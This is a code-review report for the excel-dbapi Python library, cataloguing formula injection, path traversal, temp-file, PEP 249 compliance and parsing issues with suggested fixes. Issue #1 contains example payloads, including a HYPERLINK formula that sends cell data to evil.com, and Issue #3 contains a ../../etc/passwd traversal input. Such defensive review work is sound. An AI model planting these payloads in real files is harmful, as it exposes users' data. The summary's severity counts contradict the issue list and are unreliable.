# Code Review Issues - excel-dbapi

This document contains issues identified during a comprehensive code review of the excel-dbapi project.
Issues are organized by severity and category for easier prioritization and tracking.

---

## Critical Security Issues

### Issue #1: Formula Injection Vulnerability in OpenpyxlExecutor
**Severity:** HIGH (Security Vulnerability)  
**File:** `src/excel_dbapi/engine/openpyxl_executor.py:178`  
**Category:** Security

**Description:**
When inserting data into Excel cells via INSERT statements, values are written directly without sanitization. This allows formula injection attacks where malicious formulas (starting with =, +, -, @) can be executed when the Excel file is opened.

**Evidence:**
- Line 178: `ws.append(row_values)` with no prior sanitization
- Line 114: `ws.cell(..., value=update["value"])` without validation

**Impact:**
An attacker could inject formulas like `=SYSTEM("malicious_command")` or `=HYPERLINK("http://evil.com?data="&A1)` which would execute when the Excel file is opened, potentially leading to:
- Command execution
- Data exfiltration
- Phishing attacks

**Suggested Fix:**
```python
def sanitize_cell_value(value):
    """Sanitize cell values to prevent formula injection."""
    if isinstance(value, str) and value and value[0] in ('=', '+', '-', '@'):
        return "'" + value
    return value

# Apply before writing:
row_values = [sanitize_cell_value(v) for v in row_values]
```

**References:**
- OWASP: CSV Injection (also applies to Excel)
- CWE-1236: Improper Neutralization of Formula Elements

---

### Issue #2: Formula Injection Vulnerability in PandasExecutor
**Severity:** HIGH (Security Vulnerability)  
**File:** `src/excel_dbapi/engine/pandas_executor.py:129`  
**Category:** Security

**Description:**
Similar to openpyxl executor, the pandas executor writes data without sanitizing formulas, creating the same formula injection vulnerability.

**Evidence:**
- Lines 128-129: `pd.concat([frame, pd.DataFrame([row_data])])` without sanitization

**Impact:**
Same as Issue #1 - formula injection attacks when using pandas engine.

**Suggested Fix:**
Apply the same `sanitize_cell_value()` function to all data before creating DataFrames.

---

### Issue #3: Path Traversal Vulnerability
**Severity:** MEDIUM (Security)  
**File:** `src/excel_dbapi/connection.py:29`  
**Category:** Security

**Description:**
The `file_path` parameter is not validated or sanitized, allowing potential path traversal attacks (e.g., `../../etc/passwd`) if user input is passed directly.

**Evidence:**
- Line 29: `self.file_path: str = file_path` with no validation

**Impact:**
If file paths are constructed from user input, attackers could potentially:
- Read files outside intended directories
- Write to arbitrary locations (with write operations)

**Suggested Fix:**
```python
import os
from .exceptions import OperationalError

def __init__(self, file_path: str, engine: str = "openpyxl", autocommit: bool = True):
    # Resolve to absolute path and check it exists
    file_path = os.path.realpath(file_path)
    if not os.path.exists(file_path):
        raise OperationalError(f"File not found: {file_path}")
    # Optionally: Restrict to allowed directories
    self.file_path = file_path
```

---

### Issue #4: Temp File Race Condition in OpenpyxlEngine
**Severity:** MEDIUM (Security)  
**File:** `src/excel_dbapi/engine/openpyxl_engine.py:56`  
**Category:** Security

**Description:**
The save() method creates a temporary file with `delete=False`, writes to it, then replaces the original file. There's a small window where the temp file exists with potentially sensitive data before the atomic replace.

**Evidence:**
- Lines 56-62 show the pattern with proper cleanup in finally

**Impact:**
- Temporary files with sensitive data could be accessed by other users
- Time-of-check to time-of-use (TOCTOU) vulnerability

**Suggested Fix:**
```python
with tempfile.NamedTemporaryFile(delete=False, suffix=".xlsx", dir=directory) as handle:
    temp_file = handle.name
os.chmod(temp_file, 0o600)  # Restrict to owner only
```

Also document that temporary files may briefly exist in the same directory.

---

### Issue #5: Temp File Race Condition in PandasEngine
**Severity:** MEDIUM (Security)  
**File:** `src/excel_dbapi/engine/pandas_engine.py:30`  
**Category:** Security

**Description:**
Same TOCTOU issue as openpyxl engine.

**Suggested Fix:**
Same as Issue #4.

---

## PEP 249 Compliance Issues

### Issue #6: Missing Required Methods - setinputsizes() and setoutputsize()
**Severity:** HIGH (Compliance)  
**File:** `src/excel_dbapi/cursor.py`  
**Category:** PEP 249 Compliance

**Description:**
The Cursor class is missing `setinputsizes()` and `setoutputsize()` methods which are required by PEP 249 (DB-API 2.0). While these can be no-ops for this implementation, they must be present for compliance.

**Impact:**
- Breaks PEP 249 compliance
- Code using these methods will fail with AttributeError
- Some DB frameworks expect these methods to exist

**Suggested Fix:**
```python
def setinputsizes(self, sizes):
    """Does nothing; required by PEP 249."""
    pass

def setoutputsize(self, size, column=None):
    """Does nothing; required by PEP 249."""
    pass
```

**References:**
- PEP 249: Python Database API Specification v2.0

---

### Issue #7: Exception Classes Not Exported from Package
**Severity:** HIGH (Compliance)  
**File:** `src/excel_dbapi/__init__.py`  
**Category:** PEP 249 Compliance

**Description:**
PEP 249 requires that all exception classes (Error, Warning, DatabaseError, etc.) be accessible from the module level, but they are not exported in `__all__` or imported in `__init__.py`.

**Impact:**
- Users cannot access exceptions as `excel_dbapi.DatabaseError`
- Breaks PEP 249 compliance
- Forces users to import from submodules

**Suggested Fix:**
```python
from .exceptions import (
    Error,
    Warning,
    InterfaceError,
    DatabaseError,
    DataError,
    OperationalError,
    IntegrityError,
    InternalError,
    ProgrammingError,
    NotSupportedError,
)

__all__ = [
    "ExcelConnection",
    "Error",
    "Warning",
    "InterfaceError",
    "DatabaseError",
    "DataError",
    "OperationalError",
    "IntegrityError",
    "InternalError",
    "ProgrammingError",
    "NotSupportedError",
]
```

---

### Issue #8: Incorrect Exception Type for Engine Errors
**Severity:** MEDIUM (Compliance)  
**File:** `src/excel_dbapi/connection.py:38`  
**Category:** PEP 249 Compliance

**Description:**
PEP 249 specifies that errors related to the database (file operations, connection issues) should raise `OperationalError`, not `InterfaceError`. The code raises `InterfaceError` for unsupported engines.

**Evidence:**
- Line 38: `raise InterfaceError(f"Unsupported engine: {engine}")`

**Impact:**
- Incorrect exception type makes error handling inconsistent
- InterfaceError should be for interface-related issues, not operational issues

**Suggested Fix:**
```python
raise OperationalError(f"Unsupported engine: {engine}")
```

Also check other locations where file I/O errors might be caught and ensure they raise `OperationalError`.

---

### Issue #9: No File Existence Validation
**Severity:** MEDIUM (Compliance)  
**File:** `src/excel_dbapi/connection.py:25`  
**Category:** PEP 249 Compliance

**Description:**
The `__init__` method doesn't validate that the Excel file exists before attempting to load it, leading to unclear error messages from the underlying libraries rather than a proper OperationalError.

**Evidence:**
- Lines 25-38 show engine initialization without `os.path.exists()` check

**Impact:**
- Users get library-specific errors instead of clear OperationalError
- Makes error handling inconsistent with PEP 249

**Suggested Fix:**
```python
import os
from .exceptions import OperationalError

def __init__(self, file_path: str, engine: str = "openpyxl", autocommit: bool = True):
    if not os.path.exists(file_path):
        raise OperationalError(f"File not found: {file_path}")
    # ... rest of initialization
```

---

## Functional Bugs

### Issue #10: String Parsing Doesn't Handle Escaped Quotes
**Severity:** MEDIUM (Bug)  
**File:** `src/excel_dbapi/engine/parser.py:29`  
**Category:** Bug

**Description:**
The `_parse_value()` function strips quotes from strings but doesn't handle escaped quotes within the string (e.g., `'O\'Brien'` or `"He said \"hello\""`).

**Evidence:**
- Line 29 simply returns `token[1:-1]` without processing escape sequences

**Impact:**
- Queries with escaped quotes will fail or produce incorrect results
- Cannot insert/update values containing quote characters

**Example:**
```python
cursor.execute("INSERT INTO Sheet1 (name) VALUES ('O\\'Brien')")
# This would incorrectly parse as "O\" and "Brien" instead of "O'Brien"
```

**Suggested Fix:**
```python
if token.startswith(("'", '"')) and token.endswith(("'", '"')):
    quote_char = token[0]
    content = token[1:-1]
    # Handle escaped quotes
    return content.replace(f'\\{quote_char}', quote_char)
```

---

### Issue #11: WHERE Clause AND/OR Operator Precedence
**Severity:** MEDIUM (Bug)  
**File:** `src/excel_dbapi/engine/openpyxl_executor.py:222`  
**Category:** Bug

**Description:**
WHERE clauses with mixed AND/OR operators are evaluated strictly left-to-right without respecting SQL's standard operator precedence (AND should bind tighter than OR). For example, `A OR B AND C` is evaluated as `(A OR B) AND C` instead of `A OR (B AND C)`.

**Evidence:**
- Lines 222-233 in `_matches_where()` method evaluate conditions sequentially

**Impact:**
- Incorrect query results when using mixed AND/OR
- Behavior differs from standard SQL

**Example:**
```sql
-- Standard SQL: Returns rows where active=1 OR (role='admin' AND verified=1)
SELECT * FROM users WHERE active = 1 OR role = 'admin' AND verified = 1

-- Current behavior: Returns rows where (active=1 OR role='admin') AND verified=1
```

**Suggested Fix:**
Either:
1. Document this limitation clearly in README and raise NotSupportedError for mixed operators
2. Implement proper operator precedence using parentheses parsing or AST-based evaluation

---

### Issue #12: BaseEngine.execute_with_params Ignores Parameters
**Severity:** MEDIUM (Bug)  
**File:** `src/excel_dbapi/engine/base.py:39`  
**Category:** Bug

**Description:**
The default implementation of `execute_with_params()` in BaseEngine simply calls `execute(query)` and ignores the params argument. While subclasses override this, it could lead to silent bugs if a new engine implementation forgets to override.

**Evidence:**
- Line 39: `return self.execute(query)` without using params

**Impact:**
- New engine implementations might silently ignore parameters
- Could lead to SQL injection if params are ignored

**Suggested Fix:**
```python
def execute_with_params(self, query: str, params: Optional[tuple] = None) -> ExecutionResult:
    if params is not None:
        raise NotImplementedError(
            "Subclasses must implement execute_with_params for parameterized queries"
        )
    return self.execute(query)
```

---

### Issue #13: Table Name Case Handling Confusing
**Severity:** MEDIUM (Bug)  
**File:** `src/excel_dbapi/engine/executor.py:24`  
**Category:** Bug

**Description:**
The code converts table names to lowercase for lookup but uses the lowercased name in error messages, which is confusing. For example, if user queries "MySheet", error says "Sheet 'mysheet' not found".

**Evidence:**
- Line 24: `table = parsed["table"].lower()`

**Impact:**
- Confusing error messages that don't match user input
- Makes debugging harder

**Suggested Fix:**
```python
original_table = parsed["table"]
table = original_table.lower()
data_lower = {sheet.lower(): sheet for sheet in data.keys()}
if table not in data_lower:
    raise ValueError(f"Sheet '{original_table}' not found in Excel")
```

---

### Issue #14: None Comparison Edge Case
**Severity:** LOW (Bug)  
**File:** `src/excel_dbapi/engine/openpyxl_executor.py:263`  
**Category:** Bug

**Description:**
In `_coerce_for_compare()`, if numeric coercion fails, the code falls back to `str(left), str(right)` which converts None to the string "None", potentially causing unexpected comparison results.

**Evidence:**
- Line 263 shows the fallback without explicit None handling

**Impact:**
- `WHERE value = NULL` might behave unexpectedly
- NULL comparisons should follow SQL semantics (always return false)

**Suggested Fix:**
```python
def _coerce_for_compare(self, left: Any, right: Any) -> tuple[Any, Any]:
    left_num = self._to_number(left)
    right_num = self._to_number(right)
    if left_num is not None and right_num is not None:
        return left_num, right_num
    # Handle None explicitly
    if left is None:
        left = ""
    if right is None:
        right = ""
    return str(left), str(right)
```

---

## Code Quality Issues

### Issue #15: Unused Import in PandasEngine
**Severity:** LOW (Code Quality)  
**File:** `src/excel_dbapi/engine/pandas_engine.py:1`  
**Category:** Code Quality

**Description:**
`deepcopy` is imported from the copy module but never used in the file.

**Evidence:**
- Line 1: `from copy import deepcopy`

**Impact:**
- Unnecessary import increases file load time
- Confuses code readers

**Suggested Fix:**
Remove the unused import.

---

### Issue #16: Missing Type Annotations in Decorators
**Severity:** LOW (Code Quality)  
**File:** `src/excel_dbapi/connection.py:12`, `src/excel_dbapi/cursor.py:9`  
**Category:** Code Quality

**Description:**
The `check_closed` decorator's wrapper function lacks return type annotations.

**Evidence:**
- connection.py lines 10-16
- cursor.py lines 7-13

**Impact:**
- Reduces type safety
- Makes IDE type checking less effective

**Suggested Fix:**
```python
from functools import wraps
from typing import Callable, Any

def check_closed(func: Callable) -> Callable:
    @wraps(func)
    def wrapper(self, *args: Any, **kwargs: Any) -> Any:
        if self.closed:
            raise InterfaceError("Connection is already closed")
        return func(self, *args, **kwargs)
    return wrapper
```

---

### Issue #17: CREATE TABLE Doesn't Check Duplicate Columns
**Severity:** LOW (Code Quality)  
**File:** `src/excel_dbapi/engine/parser.py:236`  
**Category:** Validation

**Description:**
When parsing CREATE TABLE, there's no validation for duplicate column names.

**Evidence:**
- Lines 246-252 append columns without checking for duplicates

**Impact:**
- Could create tables with duplicate column names
- Leads to ambiguous queries

**Example:**
```sql
CREATE TABLE MySheet (id, name, id)  -- Should fail but doesn't
```

**Suggested Fix:**
```python
columns = []
seen = set()
for col in raw_columns:
    if not col:
        continue
    col_name = col.strip().split()[0]
    if col_name in seen:
        raise ValueError(f"Duplicate column name: {col_name}")
    seen.add(col_name)
    columns.append(col_name)
```

---

### Issue #18: No Maximum LIMIT Check
**Severity:** LOW (Code Quality)  
**File:** `src/excel_dbapi/engine/parser.py:148`  
**Category:** Validation

**Description:**
No validation that LIMIT values are reasonable, allowing potential memory exhaustion with queries like `LIMIT 999999999`.

**Evidence:**
- Lines 164-167 validate that LIMIT is an integer but not its magnitude

**Impact:**
- Could cause memory exhaustion
- Poor user experience with unreasonably large limits

**Suggested Fix:**
```python
MAX_LIMIT = 1048576  # Excel's max rows
if limit is not None:
    if not isinstance(limit, int) or limit < 0:
        raise ValueError("LIMIT must be a non-negative integer")
    if limit > MAX_LIMIT:
        raise ValueError(f"LIMIT exceeds maximum of {MAX_LIMIT}")
```

---

### Issue #19: Empty Parameter Sequence Handling
**Severity:** LOW (Code Quality)  
**File:** `src/excel_dbapi/cursor.py:53`  
**Category:** Code Quality

**Description:**
`executemany()` doesn't explicitly handle an empty `seq_of_params` list, though it will work correctly (doing nothing).

**Impact:**
- Minor: Code works but less explicit
- Could confuse code readers

**Suggested Fix:**
```python
def executemany(self, query: str, seq_of_params: List[tuple]) -> "ExcelCursor":
    if not seq_of_params:
        self._results = []
        self._index = 0
        self.description = None
        self.rowcount = 0
        return self
    # ... rest of method
```

---

## Enhancement Opportunities

### Issue #20: Cursor Missing Context Manager Support
**Severity:** LOW (Enhancement)  
**File:** `src/excel_dbapi/cursor.py`  
**Category:** Enhancement

**Description:**
While not required by PEP 249, cursor objects commonly support context manager protocol for automatic cleanup.

**Impact:**
- Cannot use `with cursor:` syntax
- Users must manually call close()

**Suggested Fix:**
```python
def __enter__(self) -> "ExcelCursor":
    return self

def __exit__(self, exc_type, exc_val, exc_tb) -> None:
    self.close()
```

**Example usage:**
```python
with conn.cursor() as cursor:
    cursor.execute("SELECT * FROM Sheet1")
    results = cursor.fetchall()
# cursor automatically closed
```

---

### Issue #21: Missing Docstrings
**Severity:** LOW (Documentation)  
**Files:** Multiple  
**Category:** Documentation

**Description:**
Many public methods lack docstrings including:
- `cursor()`, `commit()`, `rollback()`, `close()` in ExcelConnection
- `execute()`, `fetchone()`, `fetchall()`, `fetchmany()` in ExcelCursor

**Impact:**
- Reduced API discoverability
- Poor IDE documentation support
- Harder for new users to understand usage

**Suggested Fix:**
Add comprehensive docstrings following PEP 257. Example:

```python
def execute(self, query: str, params: Optional[tuple] = None) -> "ExcelCursor":
    """Execute a SQL query on the Excel file.
    
    Args:
        query: SQL query string (SELECT, INSERT, UPDATE, DELETE, etc.)
        params: Optional tuple of parameters for parameterized queries
        
    Returns:
        The cursor instance for method chaining
        
    Raises:
        ProgrammingError: If the SQL query is invalid
        InterfaceError: If the cursor is closed
        
    Example:
        >>> cursor.execute("SELECT * FROM Sheet1 WHERE id = ?", (42,))
        >>> rows = cursor.fetchall()
    """
```

---

### Issue #22: Large Result Sets Stored in Memory
**Severity:** LOW (Performance)  
**File:** `src/excel_dbapi/cursor.py:28`  
**Category:** Performance

**Description:**
All query results are stored in `self._results` list, which could cause memory issues with very large result sets.

**Evidence:**
- Line 28: `self._results: List[tuple] = []` which grows unbounded

**Impact:**
- Memory exhaustion with large Excel files
- Poor performance for streaming use cases

**Note:**
This is acceptable for an Excel DB-API driver since Excel files are typically limited in size (max 1,048,576 rows). However, for very large files, consider documenting this limitation.

**Suggested Fix (Future Enhancement):**
Implement a streaming mode or lazy loading for very large sheets. This is low priority given Excel's inherent size limitations.

---

### Issue #23: Warning Class Shadows Built-in
**Severity:** LOW (Code Style)  
**File:** `src/excel_dbapi/exceptions.py:5`  
**Category:** Code Style

**Description:**
Defining `class Warning(Exception)` shadows Python's built-in Warning class, which could cause confusion.

**Evidence:**
- Lines 5-6 define the Warning exception

**Note:**
This is actually **required by PEP 249**, so it's acceptable and should not be changed. However, if you need to use Python's built-in Warning elsewhere, import as: `import warnings as warnings_module`.

**Action:**
No fix needed - this is correct per PEP 249 specification.

---

## Summary Statistics

**Total Issues:** 23

**By Severity:**
- HIGH: 8 issues (5 security, 3 compliance)
- MEDIUM: 7 issues (4 bugs, 3 compliance/security)
- LOW: 8 issues (6 code quality, 2 enhancements)

**By Category:**
- Security: 5 issues (2 critical formula injection, 3 medium)
- PEP 249 Compliance: 4 issues
- Bugs: 5 issues
- Code Quality: 6 issues
- Enhancements: 2 issues
- Documentation: 1 issue

**Priority for Fixes:**
1. **CRITICAL**: Issues #1, #2 (Formula Injection) - Security vulnerabilities
2. **HIGH**: Issues #6, #7, #8, #9 (PEP 249 Compliance)
3. **HIGH**: Issues #3, #4, #5 (Security hardening)
4. **MEDIUM**: Issues #10, #11, #12, #13 (Functional bugs)
5. **LOW**: All remaining issues (code quality and enhancements)

---

## Recommended Action Plan

### Phase 1: Critical Security Fixes
- [ ] Fix formula injection in OpenpyxlExecutor (Issue #1)
- [ ] Fix formula injection in PandasExecutor (Issue #2)

### Phase 2: PEP 249 Compliance
- [ ] Add missing cursor methods (Issue #6)
- [ ] Export exception classes (Issue #7)
- [ ] Fix exception types (Issue #8, #9)

### Phase 3: Security Hardening
- [ ] Add path validation (Issue #3)
- [ ] Secure temp file permissions (Issue #4, #5)

### Phase 4: Bug Fixes
- [ ] Fix string escape handling (Issue #10)
- [ ] Document/fix AND/OR precedence (Issue #11)
- [ ] Fix BaseEngine parameter handling (Issue #12)
- [ ] Improve error messages (Issue #13)

### Phase 5: Code Quality
- [ ] Remove unused imports (Issue #15)
- [ ] Add type annotations (Issue #16)
- [ ] Add validation (Issue #17, #18, #19)

### Phase 6: Enhancements
- [ ] Add cursor context manager (Issue #20)
- [ ] Add comprehensive docstrings (Issue #21)
- [ ] Document memory limitations (Issue #22)

---

## Testing Recommendations

For each fix, add specific test cases:

1. **Formula Injection Tests:**
   - Test inserting values starting with =, +, -, @
   - Verify they're escaped and not executed as formulas

2. **PEP 249 Compliance Tests:**
   - Test all required methods exist and are callable
   - Test exception classes are importable from package level

3. **Security Tests:**
   - Test path traversal attempts
   - Test temp file permissions

4. **Bug Fix Tests:**
   - Test escaped quotes in strings
   - Test AND/OR operator combinations
   - Test case-sensitive table names

---

*Generated: 2026-01-24*  
*Repository: yeongseon/excel-dbapi*  
*Review Scope: All Python files in src/excel_dbapi/*
